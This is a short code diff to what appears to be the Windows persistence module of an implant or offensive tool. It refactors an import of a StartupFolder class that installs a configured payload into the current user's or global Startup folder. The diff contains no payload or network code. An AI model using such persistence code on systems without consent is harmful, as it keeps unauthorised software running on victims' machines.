@@ -3,7 +3,7 @@ windows.py: Windows-specific persistence logic.
 """
 
 from .base import Persistence
-from .windows_utilities import startup
+from .windows_utilities.startup import StartupFolder
 from .windows_utilities.persistence_methods import WindowsPersistenceMethods
 
 
@@ -57,10 +57,10 @@ class WindowsPersistence(Persistence):
         method = self.configured_persistence_method()
 
         if method == WindowsPersistenceMethods.STARTUP_CURRENT_USER.value:
-            startup.StartupFolder(payload=self.payload).install_current_user()
+            StartupFolder(payload=self.payload).install_current_user()
             return
         if method == WindowsPersistenceMethods.STARTUP_GLOBAL.value:
-            startup.StartupFolder(payload=self.payload).install_global()
+            StartupFolder(payload=self.payload).install_global()
             return
 
         raise NotImplementedError(f"Method {method} not implemented.")
